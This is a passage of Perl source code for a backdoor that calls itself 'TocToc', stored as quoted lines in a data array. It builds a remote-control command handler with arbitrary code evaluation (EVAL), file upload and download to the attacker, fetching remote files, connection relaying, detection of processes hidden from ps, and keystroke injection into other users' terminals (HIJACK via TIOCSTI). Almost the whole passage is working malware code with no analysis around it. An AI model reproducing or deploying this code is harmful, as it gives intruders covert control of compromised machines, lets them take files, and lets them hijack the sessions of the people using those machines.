            "              close(REL);",
            "            }",
            "            $release = \"Slackware $release\" if ($release_file eq \"/etc/slackware-version\");",
            "            $release = \"Debian GNU/Linux $release\" if ($release_file eq \"/etc/debian_version\");",
            "            if ($release_file and !(grep { $release_file eq \"/etc/$_\" } @release_files)) {",
            "              $release = \"Guess $release\" unless(grep { $release_file eq \"/etc/$_\" } @release_files);",
            "            }",
            "            $release = \"[$release]\" if ($release ne \"\");",
            "     ",
            "            $release =~ s/\\n$//;",
            "            my @send = (",
            "                    \"Hostname:               $hostname\",",
            "                    \" \",",
            "                    \"Operation System:       $OS $release\",",
            "                    \"Kernel version:         $kernel\",",
            "                    \" \",",
            "                    \"System UPTime:          $uptime\",",
            "                    \"BackDoor UPTime:        $bd_uptime\",",
            "                    \" \",",
            "                    \"CPUs Number:            \".$CPU{CPUS},",
            "                    \"CPU Load:               $cpu_load\");",
            "                   ",
            "            for (my $c = 1; $c <= $CPU{CPUS}; $c++) {",
            "               my $cpun = $c;",
            "               $cpun = '' if ($c == 1);",
            "               my $space = \" \" x (3-length($cpun));",
            "               push(@send, (\"CPU$cpun MHz:             $space\".$CPU{$c}{'cpu MHz'},",
            "                            \"CPU$cpun Vendor ID:       $space\".$CPU{$c}{'vendor_id'},",
            "                            \"CPU$cpun Model name:      $space\".$CPU{$c}{'model name'}));",
            "            }",
            "            push(@send, (\" \",",
            "                         \"Memory Total:           \".int($MEM{'MemTotal'}/1000).\" MB\",",
            "                         \"Memory Free:            \".int($MEM{'MemFree'}/1000).\" MB\",",
            "                         \" \",",
            "                         \"Running process:        $procs\",",
            "                         \" \",",
            "                         \"INet Device:            $pdev\",",
            "                         \"Received bytes:         $received\",",
            "                         \"Sended bytes:           $sended\"));",
            "          foreach my $send (@send) {",
            "            spm($proto, $cmd, $send);",
            "          }",
            "          spm_done($proto, $cmd);",
            "        } elsif ($cmd eq \"W\") {",
            "            my %PROC = w_procps();",
            "            spm($proto, $cmd, \"USER          TTY           FROM     LOGGED    IDLE  WHAT\");",
            "            foreach my $cli (keys(%CLIENT)) {",
            "              my $cli_sock = $CLIENT{$cli}->{sock};",
            "              my $cli_shell = $CLIENT{$cli}->{shell};",
            "              my $idle = time - $CLIENT{$cli}->{last_msg};",
            "              my $show_idle = stat_time($idle);",
            "              my $login = time - $CLIENT{$cli}->{login_time};",
            "              my $show_login = stat_time($login, \"h\");",
            "              my $ttyname = $cli_shell->ttyname;",
            "              $ttyname =~ /^\\/dev\\/(.*)/;",
            "              my $pts = $1;",
            "              my $show_starttime = stat_time((time-$PROC{$ttyname}{starttime}), \"h\");",
            "              my $user = getpwuid($PROC{$ttyname}{UID});",
            "              my $line = $user.(\" \" x (10-(length($user)))).fill_space($pts, 7).fill_space($cli_sock->peerhost, 15).fill_space($show_login, 11).fill_space($show_idle, 8).\"  \".$PROC{$ttyname}{cmd};",
            "               spm($proto, $cmd, $line);",
            "            }",
            "            spm_done($proto, $cmd);",
            "        } elsif ($cmd eq \"VERSION\") {",
            "            spm_done($proto, $cmd, \"TocToc $VERSION by 0ldW0lf (oldwolf\\@atrixteam.net)\");",
            "        } elsif ($cmd eq \"GET\") {",
            "            sendfile($cli, @args);",
            "        } elsif ($cmd eq \"PUT\") {",
            "            getfile($cli, @args);",
            "        } elsif ($cmd eq \"EVAL\") {",
            "            my $ret = eval \"$arg\";",
            "            spm_done($proto, $cmd, \"Evaluation returned: $ret\");",
            "        } elsif ($cmd eq \"SOCKLIST\") {",
            "            socklist($proto, \"$arg\");",
            "            spm_done($proto, $cmd);",
            "        } elsif ($cmd eq \"PWD\") {",
            "            my $dir = getcwd();",
            "            spm_done($proto, $cmd, \"$dir\");",
            "        } elsif ($cmd eq \"LAG\") {",
            "            spm_done($proto, $cmd, $arg);",
            "#        } elsif ($cmd eq \"OPEN\") {",
            "#            sopen($cli, @args);",
            "#        } elsif ($cmd eq \"OPEN2\") {",
            "#            sopen2($cli, @args);",
            "        } elsif ($cmd eq \"OPEN\") {",
            "            sopen2($cli, @args);",
            "        } elsif ($cmd eq \"CD\") {",
            "            if (chdir(\"$arg\")) {",
            "              my $dir = getcwd();",
            "              spm($proto, $cmd, \"Changed directory to: $dir\");",
            "            } else {",
            "               spm($proto, $cmd, \"I could not change directory to: $arg\");",
            "            }",
            "            spm_done($proto, $cmd);",
            "        } elsif ($cmd eq \"DOWNLOAD\") {",
            "            my ($url, $file) = @args;",
            "            my $pwd = getcwd();",
            "            unless(defined($file)) {",
            "              $file = $url;",
            "              $file =~ s/^.*\\/(\\S+)$/$1/;",
            "            }",
            "            $file = \"$pwd/$file\";",
            "            $file =~ s/^\\/\\//\\//;",
            "            unless(open(FILE, \"> $file\")) {",
            "              spm_done($proto, $cmd, \"Error: Cannot creat $file\");",
            "              next;",
            "            }",
            "            close(FILE);",
            "            unless(download($cli, $url, $file))  {",
            "              spm_done($proto, $cmd, \"Error: I could not fork() the process.\");",
            "              next;",
            "            }",
            "        } elsif ($cmd eq \"PS\") {",
            "            my @ps = ps();",
            "            if (scalar(@ps) == 0) {",
            "              spm_done($proto, $cmd, \"None hidden procces has been found.\");",
            "            } else {",
            "               foreach my $ps (@ps) {",
            "                 spm($proto, $cmd, \"$ps\");",
            "               }",
            "               spm_done($proto, $cmd);",
            "            }",
            "        } else {",
            "           spm_done($proto, $cmd, \"Error: Command \\'$cmd\\' not implemented in this version ($VERSION).\");",
            "        }",
            "      }",
            "    }",
            "  sub netinfo {",
            "     my ($bytes_in, $bytes_out);",
            "     open(NET, \"< /proc/net/dev\");",
            "     while (<NET>) {",
            "       if (/^.+?$pdev\\:.+?(\\d+)\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+(\\d+)/) {",
            "         $bytes_in = $1;",
            "         $bytes_out = $2;",
            "         last;",
            "       }",
            "     }",
            "     close(NET);",
            "     if ($bytes_in < 1024**3) {",
            "        $bytes_in = sprintf(\"%.02f\",$bytes_in / 1024**2).\" M\";",
            "     } else {",
            "        $bytes_in = sprintf(\"%.02f\", $bytes_in / 1024**3).\" G\";",
            "     }",
            "     if ($bytes_out < 1024**3) {",
            "        $bytes_out = sprintf(\"%.02f\",$bytes_out / 1024**2).\" M\";",
            "     } else {",
            "        $bytes_out = sprintf(\"%.02f\", $bytes_out / 1024**3).\" G\";",
            "     }",
            "     return($bytes_in, $bytes_out);",
            "  sub sysload {",
            "    open(LOAD, \"< /proc/loadavg\") || return(\"Error: I could not open /proc/loadavg\");",
            "    my $load = <LOAD>;",
            "    close(LOAD);",
            "    $load =~ /^(.+?)\\s+/;",
            "    return($1);",
            "  sub uptime {",
            "    open(UPT, \"< /proc/uptime\") || return(\"Error: I could not open /proc/uptime\");",
            "    my $uptime = <UPT>;",
            "    close UPT;",
            "    $uptime =~ /^(.+?)\\s+(.*)/;",
            "    my $s = int($1);",
            "    return(stat_time($s, \"d\"));",
            "  sub meminfo {",
            "    my %MEM;",
            "    open(MEM, \"< /proc/meminfo\") || return(\"Error: I could not open /proc/meminfo\");",
            "    while (<MEM>) {",
            "      next unless (/^(.+?)\\:\\s+(\\d+)/);",
            "      $MEM{$1} = $2;",
            "    }",
            "    close(MEM);",
            "    return(%MEM);",
            "  sub cpuinfo {",
            "    my %CPU;",
            "    my $cpu_counter = 0;",
            "    open(CPU, \"< /proc/cpuinfo\") || return(\"Error: I could not open /proc/cpuinfo\");",
            "    while (<CPU>) {",
            "      if (/^processor/) {",
            "        $cpu_counter++;",
            "      } else {",
            "         next unless (/^(.+?)\\s+\\:\\s+(.*?)\\n$/);",
            "         $CPU{$cpu_counter}{$1} = $2;",
            "      }",
            "    }",
            "    close(CPU);",
            "    $CPU{CPUS} = $cpu_counter;",
            "    return(%CPU);",
            "  sub spm_done {",
            "     my ($proto, $cmd, $msg) = @_;",
            "     if (defined($msg)) {",
            "       spm($proto, $cmd, $msg);",
            "     }",
            "     spm($proto, $cmd, \"DONE\");",
            "  sub spm {",
            "    my ($proto, $cmd, $ans) = @_;",
            "    my $send = \"\\001T:$cmd $ans:\\002\\n\";",
            "    syswrite($proto, $send, length($send));",
            "  sub ps {",
            "     my @result;",
            "     opendir(DIR, \"/proc\");",
            "     my @proc= readdir(DIR);",
            "     closedir(DIR);",
            "     @proc = grep { -d \"/proc/\".$_  and $_ =~ /^\\d+$/ } @proc;",
            "     my @ps = `ps ax`;",
            "     @ps = grep { s/^(|\\s+)(\\d+).*\\n/$2/ } @ps;",
            "     foreach my $pid (@proc) {",
            "        next if (grep { $_ eq $pid } @ps);",
            "        open(CMD, \"/proc/$pid/cmdline\");",
            "        my $cmd = <CMD>;",
            "        close(CMD);",
            "        $cmd =~ s/\\0/ /g;",
            "        $cmd =~ s/\\s+$//;",
            "        my $dir = readlink(\"/proc/$pid/cwd\");",
            "        push(@result, \"PID: $pid ($cmd) [$dir]\");",
            "     }",
            "     return(@result);",
            "# THIS FUNCTION WAS REMOVED",
            "# READ THE CLIENT",
            "#  sub sopen { ",
            "#    my ($cli, $ip, $port) = @_;",
            "#    my $proto = $CLIENT{$cli}->{proto};",
            "#    my $open_sock = IO::Socket::INET->new(PeerAddr => \"$ip\", PeerPort => \"$port\", Timeout => 15);",
            "#    unless($open_sock) {",
            "#      print $proto \"\\003FINISHED-I could not connect on $ip:$port\\002\";",
            "#      return();",
            "#    }",
            "#    $open_sock->autoflush(1);",
            "#    my $pid = fork();",
            "#    if (not defined($pid)) {",
            "#       print $proto \"\\003FINISHED-Error on fork()\\002\";",
            "#    }",
            "#    unless ($pid) {",
            "#      my $sel = IO::Select->new($open_sock);",
            "#      $sel->add($proto);",
            "#      while ( 1 ) {",
            "#        foreach my $fh ($sel->can_read(0.1)) {",
            "#          my $msg;",
            "#          my $nread = sysread($fh, $msg, $buffer);",
            "#          if ($nread == 0) {",
            "#            if ($fh eq $proto) {",
            "#               $open_sock->close() if ($open_sock);",
            "#            } else {",
            "#               print $proto \"\\003FINISHED-Connection closed.\\002\";",
            "#            }",
            "#            $sel->remove($proto);",
            "#            $sel->remove($open_sock);",
            "#            undef($sel);",
            "#            exit;",
            "#          }",
            "#          if ($fh eq $proto) {",
            "#             if ($msg =~  /\\001T:.*:\\002\\n/) {",
            "#               parse_msg($cli, $msg);",
            "#             } else {",
            "#                syswrite($open_sock, $msg, length($msg));",
            "#             }",
            "#          } else {",
            "#              syswrite($proto, $msg, length($msg));",
            "#          }",
            "#        }",
            "#      }",
            "#      exit; # ???",
            "#    }   ",
            "#  }",
            "  sub sopen2 {",
            "    my ($cli, $ip, $port, $cli_port) = @_;",
            "    my $cli_host = $cli->peerhost;",
            "    my $pid = fork();",
            "    unless($pid) {",
            "      my $sock = IO::Socket::INET->new(PeerAddr => $cli_host, PeerPort => $cli_port, Proto => \"tcp\", Timeout => 15) || exit;",
            "      $sock->autoflush(1);",
            " #     print \"conectando cliente $cli_host:$cli_port\\n\"; ",
            "      my $sel = IO::Select->new($sock);",
            "      my $remote;",
            "      my $go = 0;",
            "      while ( 1 ) {",
            "        foreach my $fh ($sel->can_read(0.01)) {",
            "           my $msg;",
            "           my $nread = sysread($fh, $msg, $buffer);",
            "           if ($nread == 0) {",
            "              sleep(1);",
            "              $sel->remove();",
            "              $sock->close() if ($sock);",
            "              $remote->close() if ($remote);",
            "              exit;",
            "           }",
            "           if ($fh eq $sock) {",
            "             if ($go == 0) {",
            "#               print \"conectando -> $ip:$port\\n\";",
            "               $remote = IO::Socket::INET->new(PeerAddr => $ip, PeerPort => $port, Proto => \"tcp\");",
            "               unless ($remote) {",
            "                 print $sock \"I could not connect on $ip:$port\\n\";",
            "                 $sel->remove();",
            "                 $sock->close() if ($sock);",
            "                 exit;",
            "               }",
            "               $sel->add($remote);",
            "               $go = 1;",
            "             } else {",
            "                syswrite($remote, $msg, length($msg));",
            "             }",
            "           } else {",
            "               syswrite($sock, $msg, length($msg));",
            "           }",
            "        }",
            "      }",
            "    }",
            "  sub hijack {",
            "    my ($cli, $device, $msg) = @_;",
            "    unless(open(TTY, \"+>$device\")) {",
            "      spm_done($cli, \"HIJACK\", \"I could not open tty $device\");",
            "      return();",
            "    }",
            "    # i hope it works",
            "    unless (defined(&TIOCSTI)) {",
            "      spm($cli, \"HIJACK\", \"WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).\");",
            "      eval 'sub TIOCSTI () {0x5412;}';",
            "      spm_done($cli, \"HIJACK\");",
            "      close(TTY);",
            "      return();",
            "    }",
            "    $msg .= \"\\n\";",
            "    foreach my $char (split('', $msg)) {",
            "      spm($cli, \"HIJACK\", \"Hey yo! I couldn't write on $device: $!\")",
            "      unless (ioctl(TTY, &TIOCSTI, $char));",
            "    }",
            "    close(TTY);",
            "    spm_done($cli, \"HIJACK\");",
            "  sub getfile {",
            "     my ($cli, $file, $port) = @_;",
            "     my $pid = fork();",
            "     return(undef) if (not defined($pid));",
            "     unless ($pid) {",
            "       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);",
            "       exit unless($transfer);",
            "       $transfer->autoflush(1);",
            "       my $OK = 1;",
            "       if (-e \"$file\") {",
            "         syswrite($transfer, \"File already exists.\", 20);",
            "         $OK = 0;",
            "       }",
            "       unless (open(FILE, \"> $file\")) {",
            "         syswrite($transfer, \"I could not open the file.\", 26);",
            "         $OK = 0;",
            "       }",
            "       syswrite($transfer, \"OK\", 2) if ($OK == 1);",
            "       sleep(1);",
            "       my $msg;",
            "       my $got_info = 0;       ",
            "       my $bytes = 0;",
            "       while ( 1 ) {",
            "          my $ready = sysread($transfer, $msg, $buffer);",
            "          if ($ready == 0) {",
            "             close(FILE);",
            "             exit;",
            "          }",
            "          if ($got_info == 0) {",
            "            $got_info = 1;",
            "            my $pack = pack(\"N\", 0);",
            "            syswrite($transfer, $pack, length($pack));",
            "            next;",
            "          }",
            "          print FILE $msg;",
            "          $bytes += length($msg);",
            "          my $got_bytes = pack(\"N\", $bytes);",
            "          syswrite($transfer, $got_bytes, length($got_bytes));",
            "       }",
            "       exit;",
            "     }",
            "  sub sendfile {",
            "     my ($cli, $file, $port) = @_;",
            "     my $pid = fork();",
            "     return(undef) if (not defined($pid));",
            "     unless ($pid) {",
            "#       print \"pid forcado\\n\";",
            "       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);#       print \"opa.. vamu v\\n\";",
            "       exit unless($transfer);",
            "#       print \"eh eh conectado\\n\";",
            "       $transfer->autoflush(1);",
            "       unless (-e \"$file\") {",
            "          syswrite($transfer, \"File not found.\", 15);",
            "       }",
            "       unless (open(FILE, \"< $file\")) {",
            "         syswrite($transfer, \"I could not open the file.\", 26);",
            "       }",
            "       my $bytes = (stat(\"$file\"))[7];",
            "       syswrite($transfer, $bytes, length($bytes));",
            "       my $msg;",
            "#       print \"humm vo comeca a manda o arkivo\\n\";",
            "       while ( 1 ) {",
            "          my $ready = sysread($transfer, $msg, $buffer);",
            "          if ($ready == 0) {",
            "            close(FILE);",
            "            exit;",
            "          }",
            "          my $sended_bytes = unpack(\"N\", $msg);",
            "          seek(FILE, $sended_bytes, 0);",
            "          my $send_bytes;",
            "          read(FILE, $send_bytes, 1024);",
            "          syswrite($transfer, $send_bytes, length($send_bytes));",
            "       }",
            "       exit;",
            "     }",
            "  # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997",
            "  # adapted for TocToc use",
            "  sub socklist {",
            "    my ($proto, $protocol) = @_;",
            "    undef($protocol) if ($protocol eq \"0\" );",
            "    my $init = 0;",
            "    my %sock_proc;",
            "    opendir (PROC, \"/proc\") || spm($proto, \"SOCKLIST\", \"Error: Could not open /proc\");",
            "    for my $f (readdir(PROC)) {",
            "        next if (! ($f=~/[0-9]+/) );",
            "        if (! opendir (PORTS, \"/proc/$f/fd\")) {",
            "            closedir PORTS;",
            "            next;",
            "        }",
            "        for my $g (readdir(PORTS)) {",
            "            next if (! ($g=~/[0-9]+/) );",
            "            my $r=readlink(\"/proc/$f/fd/$g\");",
            "    ",
            "            my ($dev,$ino)=($r=~/^(socket|\\[[0-9a-fA-F]*\\]):\\[?([0-9]*)\\]?$/);",
            "            if ($dev == \"[0000]\" || $dev == \"socket\") {$sock_proc{$ino}=$f.\":\".$g;}    }",
            "        closedir PORTS;",
            "    }",
            "    closedir PROC;",
            "    sub scheck {",
            "      open(FILE,\"/proc/net/\".$_[0]) || spm($proto, \"SOCKLIST\", \"Error: Could not open file /proc/net/\".$_[0].\" for reading.\");",
            "      while (<FILE>) {",
            "          my @F=split();",
            "          next if ($F[9]=~/uid/);",
            "          my @A=split(\":\",$F[1]);",
            "          my $a=hex($A[1]);",
            "          my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);",
            "          my $cmd = \"\";",
            "          if ($pid && open (CMD,\"/proc/$pid/status\")) {",
            "             my $l = <CMD>;",
            "             ($cmd) = ( $l=~/Name:\\s*(\\S+)/ );",
            "             close(CMD);",
            "          }",
            "          if ($init == 0 ) {",
            "              spm($proto, \"SOCKLIST\", \"type  port      inode     uid    pid   fd  name\");",
            "              $init = 1;",
            "          }",
            "          my $string = sprintf(\"%s %6d %10d  %6d %6d %4d  %s\", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);",
            "          spm($proto, \"SOCKLIST\", $string);",
            "      }",
            "      close(FILE);",
            "    }",
            "    if (not defined($protocol)) {",
            "      scheck(\"tcp\");",
            "      scheck(\"udp\");",
            "      scheck(\"raw\");",
            "    } elsif (grep { $_ eq $protocol } (\"tcp\", \"udp\", \"raw\")) {",
            "        scheck(\"$protocol\");",
            "    } else {",
            "       spm($proto, \"SOCKLIST\", \"Error: protocol \".uc($protocol).\" not found in the list (UDP, TCP, RAW)\");",
            "    }",
            "       ",
            "  sub download {",
            "    my ($cli, $link, $file) = @_;",
            "    my $proto = $CLIENT{$cli}->{proto};",
            "    pipe(RDR, WTR);",
            "    WTR->autoflush(1);",
            "    RDR->autoflush(1);",
            "    $CLIENT{$cli}->{DOWNLOAD_PIPE} = \\*WTR;",
            "    my $pid = fork();",
            "    return(undef) if not defined($pid);",
            "    unless($pid) {",
            "      close(WTR);",
            "      unless(open(FILE, \"> $file\")) {",
            "        spm_done($proto, \"DOWNLOAD\", \"I could not open $file for writting\");",
            "        exit;",
            "      }",
            "      my $first = 1;",
            "      my $init_time = Time::HiRes::time;",
            "      my $saved_data = 0;",
            "      if ($link =~ /^http/i) {",
            "        my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );",
            "        my $req = new HTTP::Request GET => $link;",
            "        my $res = $ua->request($req,\\&http_save_data, 4096);",
            "        $init_time = Time::HiRes::time;",
            "        if ($res->header(\"X-Died\") || !$res->is_success) {",
            "          spm($proto, \"DOWNLOAD\", \"Error: Download was interrupted by peer.\");",
            "        } else {",
            "           spm($proto, \"DOWNLOAD\", \"Download finished, file $file has been saved.\");",
            "        }",
            "      } elsif ($link =~ /^ftp/i) {",
            "          $link =~ s/^ftp:\\/\\///;",
            "          $link =~ /(.+?)\\/(.*)/;",
            "          my $host = $1;",
            "          my $file = $2;",
            "          my $save = $link;",
            "          $save =~ s/.*\\/(.+?)$/$1/;",
            "          unless ($host or $file) {",
            "            spm_done($proto, \"DOWNLOAD\", \"Unrecognized ftp link\");",
            "            exit;",
            "          }",
            "          my $sock = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => 21, Proto => \"tcp\", Timeout => 15);",
            "          unless ($sock) {",
            "            spm_done($proto, \"DOWNLOAD\", \"Error: I could not connect on host ($host:21)\");",
            "            exit;",
            "          }",
            "          my $logado = 0;",
            "          print $sock \"USER anonymous\\nPASS anonymous\\@anonymous.com\\n\";",
            "          my ($size, $trans);",
            "          while (<$sock>) {",
            "             my $buf = $_;",
            "             $buf =~ s/\\n//;",
            "             if ($buf =~ /^230/ and $logado == 0) {",
            "               $logado = 1;",
            "               print $sock \"TYPE I\\nPASV\\nRETR $file\\n\";",
            "             } elsif ($buf =~ /^150.+?\\((\\d+)\\s.+?\\)/) {",
            "                $size = $1;",
            "                $init_time = Time::HiRes::time;",
            "                my $saved_data = 0;",
            "                open(FILE, \"> $save\");",
            "                while (<$trans>) {",
            "                  print FILE $_;",
            "                  $saved_data += length($_);",
            "                  gotta_die();",
            "                  if ($first == 1) {",
            "                    spm($proto, \"DOWNLOAD\", \"Stats: Downloading $link ($size size). Type ^C to abort\");",
            "                    $first = 0;",
            "                  } else {",
            "                     ProgressBar($cli, $init_time, $saved_data, $size);",
            "                  }",
            "                }",
            "                close(FILE);",
            "                print $sock \"QUIT\\n\";",
            "                last;",
            "             } elsif ($buf =~ /^530/ and $logado == 1) {",
            "                 spm_done($proto, \"DOWNLOAD\", \"Error: File not found.\");",
            "                 exit;",
            "             } elsif ($buf =~ /^227.+?\\((.*)\\)/) {",
            "                 my @info = split(',', $1);",
            "                 my $host = join('.', @info[0 .. 3]);",
            "                 my $port = $info[4] * 256 + $info[5];",
            "                 $trans = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => \"$port\", Proto => \"tcp\");",
            "                 unless ($trans) {",
            "                   spm_done($proto, \"DOWNLOAD\", \"Error: I could not estabilish the transfer connection\");",
            "                   exit;",
            "                 }",
            "             }",
            "          }",
            "      } else {",
            "         spm($proto, \"DOWNLOAD\", \"Link MUST begin with http:// or ftp://\");",
            "      }",
            "      spm_done($proto, \"DOWNLOAD\");",
            "      sleep(1);",
            "      exit;",
            "      sub http_save_data {",
            "        my($data, $response, $protocol) = @_;",
            "        print FILE $data;",
            "        gotta_die();",
            "        $saved_data += length($data);",
            "        my $total_data = $response->content_length;",
            "        if ($first == 1) {",
            "          spm($proto, \"DOWNLOAD\", \"Stats: Downloading $link ($total_data size). Type ^C to abort\");",
            "          $first = 0;",
            "        } else {",
            "             ProgressBar($cli, $init_time, $saved_data, $total_data);",
            "        }",
            "      }",
            "      sub gotta_die {",
            "        my $readfields = '';",
            "        vec($readfields, fileno(RDR), 1) = 1;",
            "        my $ready = select($readfields, undef, undef, 0);",
            "        if ($ready == 1) {",
            "          sleep(1);",
            "          exit;",
            "        }",
            "      }",
            "    }",
            "    close(RDR);",
            "    return(1);",
            "  # i like the wget look so i based this function on it :)",
            "  sub ProgressBar {",
            "    my ($cli, $init_time, $saved_bytes, $total_bytes) = @_;",
            "    ",
            "    my $proto = $CLIENT{$cli}->{proto};",
            "    my @term_size = split(/ +/, $CLIENT{$cli}->{termsize});",
            "    $term_size[0] = 70 unless defined($term_size[0]);",
            "    # time  #",
            "    my $d_time = (Time::HiRes::time())-$init_time;",
            "    # size #",
            "    my $unit = \"Kb/s\";",
            "    my $Sps = ($saved_bytes/$d_time) / 1024;",
            "    if ($Sps > 1024) {",
            "       $Sps = $Sps/1024;",
            "       $unit = \"Mb/s\";",
            "    }",
            "    $Sps = round($Sps, 2);",
            "    # percentage #",
            "    my $percent = ($saved_bytes*100)/$total_bytes;",
            "    $percent = round($percent, 1);",
            "    # i hope someone teach me a better way :/",
            "    my $s_saved_bytes = reverse($saved_bytes);",
            "    $s_saved_bytes =~ s/(...)/$1,/g;",
            "    $s_saved_bytes = reverse($s_saved_bytes);",
            "    $s_saved_bytes =~ s/^\\,//;",
            "    my $s_total_bytes = reverse($total_bytes);",
            "    $s_total_bytes =~ s/(...)/$1,/g;",
            "    $s_total_bytes = reverse($s_total_bytes);",
            "    $s_total_bytes =~ s/^\\,//;",
            "    # cauculating ETA #",
            "    my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);",
            "    my $eta_h = int($eta_s/3600);",
            "    $eta_s %= 3600;",
            "    my $eta_m = int($eta_s/60);",
            "    $eta_s %= 60;",
            "    $eta_h = \"0$eta_h\" if (length($eta_h) == 1);",
            "    $eta_m = \"0$eta_m\" if (length($eta_m) == 1);",
            "    $eta_s = \"0$eta_s\" if (length($eta_s) == 1);",
            "    # positionating the info on the screen #",
            "    my $show_percent = fill_space($percent, 6);",
            "    my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));",
            "    my $show_Sps = fill_space($Sps, 9);",
            "    my $show_eta = fill_space(\"$eta_h:$eta_m:$eta_s\", 9);",
            "    $show_eta = \"--:--:--\" if (length($show_eta) > 9);",
            "    my $total_chars = length(\" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta\");",
            "    # bars #",
            "    my $total_bars = $term_size[0]-5-$total_chars;",
            "    if($total_bars < 10) {",
            "       out(\"Your terminal size is too small\\r\");",
            "       return;",
            "    }",
            "    my $bar_per_byte = $total_bars/$total_bytes;",
            "    my $bars_n = $bar_per_byte * $saved_bytes;",
            "    # yeah u know 0.something may do this",
            "    $bars_n = $total_bars if ($saved_bytes == $total_bytes);",
            "    $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);",
            "    my $bars = \"=\" x $bars_n;",
            "    my $blank_n = $total_bars-$bars_n;",
            "    my $blank = \" \" x $blank_n;",
            "    $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);",
            "    $blank .= ' ' if ($total_bars != $bars_n);",
            "    my $blank_end = \" \" x 5;",
            "    spm($proto, \"DOWNLOAD\", \"\\r $show_percent% \\033[1m\".\"[$bars$blank]\".\"\\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end\");",
            "  sub round {",
            "    my ($number, $decimals) = @_;",
            "    my ($int,$dec) = split('\\.', $number);",
            "    return(\"$int.\".(\"0\" x $decimals)) unless (defined($dec));",
            "    my @dec_ns = split('', $dec);",
            "    return(\"$int.$dec\".(\"0\" x ($decimals-(scalar(@dec_ns)))))",
            "      if (scalar(@dec_ns) < $decimals);",
            "    my $last_on_next = 0;",
            "    for (my $c = $#dec_ns; $c >= 0; $c--) {",
            "      if ($dec_ns[$c] >= 5) {",
            "        if (($c-1) < 0) {",
            "          $int++;",
            "        } else {",
            "           $dec_ns[$c-1]++;",
            "        }",
            "        $dec_ns[$c] = 0;",
            "      }",
            "      last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);",
            "      last if ($c == $decimals and $dec_ns[$c-1] != 10);",
            "      $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);",
            "    }",
            "    my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);",
            "    my $dot = \".\" if ($decimals != 0);",
            "    return(\"$int$dot$new_dec\");",
            "  sub fill_space {",
            "    my ($chars, $max) = @_;",
            "    my $filled = length($chars);",
            "    my $space_n  = $max-$filled;",
            "    return($chars) if ($space_n <= 0);",
            "    my $space = \" \" x $space_n;",
            "    return($space.$chars);",
            "  # this function get the info like \"w\" does but",
            "  # it doesn't use wtmp to get the loged users.",
            "  # I made it just to get the running process info",
            "  # in pts/* devices.",
            "  sub w_procps {",
            "    my $btime;",
            "    open(STAT, \"< /proc/stat\");",
            "    while (<STAT>) {",
            "      if (/^btime\\s+(\\d+)\\n/i) {",
            "        $btime = $1;",
            "        last;",
            "      }",
            "    }",
            "    close(STAT);",
            "    opendir(PROC, \"/proc\");",
            "    my @files = readdir(PROC);",
            "    closedir(PROC);",
            "    @files = grep { -d \"/proc/$_\" and $_ =~ /^\\d+$/ } @files;",
            "    my %PROC;",
            "    foreach my $pid (@files) {",
            "      open(STAT, \"< /proc/$pid/stat\");",
            "      my $stat = <STAT>;",
            "      close(STAT);",
            "      my @proc_stat = split(/ /, $stat);",
            "      my $devnum = $proc_stat[6];",
            "      my $tpgid = $proc_stat[7];",
            "      my $starttime = ($proc_stat[21]/$Hertz)+$btime;",
            "      next if ($tpgid != $pid);",
            "      next if ($devnum == 0);",
            "      # look up the tty name",
            "      opendir(PTS, \"/dev/pts\");",
            "      my @files = readdir(PTS);",
            "      closedir(PTS);",
            "      @files = grep { $_ ne '.' and $_ ne '..' } @files;",
            "      my ($dev) = grep { (stat(\"/dev/pts/$_\"))[6] eq $devnum } @files;",
            "      # undefined $dev means for us that the proc",
            "      # has not been ran from a /dev/pts/* device",
            "      next unless($dev);",
            "      my $ttyname = \"/dev/pts/$dev\";",
            "      if (not defined($PROC{$ttyname}) or $PROC{$ttyname}{starttime} < $starttime) {",
            "        $PROC{$ttyname}{PID} = $pid;",
            "        $PROC{$ttyname}{starttime} = $starttime;",
            "      }",
            "    }",
            "    foreach my $dev (keys(%PROC)) {",
            "      open(FH, \"< /proc/\".$PROC{$dev}{PID}.\"/cmdline\");",
            "      my $cmd = <FH>;",
            "      $cmd =~ s/\\0/ /g;",
            "      $cmd =~ s/\\s+$//;",
            "      close(FH);",
            "      my $idle = time-(stat($dev))[8];",
            "      $PROC{$dev}{idle} = $idle;",
            "      $PROC{$dev}{cmd} = $cmd;",
            "      ($PROC{$dev}{UID}, $PROC{$dev}{GID}) = (stat(\"/proc/\".$PROC{$dev}{PID}))[4, 5];",
            "    }",
            "    return(%PROC);",
            "  sub stat_time {",
            "    my ($sec, $type) = @_;",
            "    my $days = int($sec/86400);$sec %= 86400;",
            "    my $hour = int($sec/3600); $sec %= 3600;",
            "    my $minute = int($sec/60); $sec %= 60;",
            "    ",
            "    $hour = \"0$hour\"     if (length($hour) == 1);",
            "    $minute = \"0$minute\" if (length($minute) == 1);",
            "    $sec = \"0$sec\"       if (length($sec) == 1);",
            "    if ($type eq \"h\") {",
            "      $hour += $days*24;",
            "      return(\"$hour:$minute:$sec\");",
            "    } elsif ($type eq \"d\") {",
            "       return(\"$days day(s), $hour:$minute:$sec\");",
            "    } else {",
            "       return(\"$minute:$sec\");",
            "    }",
            "      ",
            "  sub write_shell {",
            "    my ($shell, $msg) = @_;",
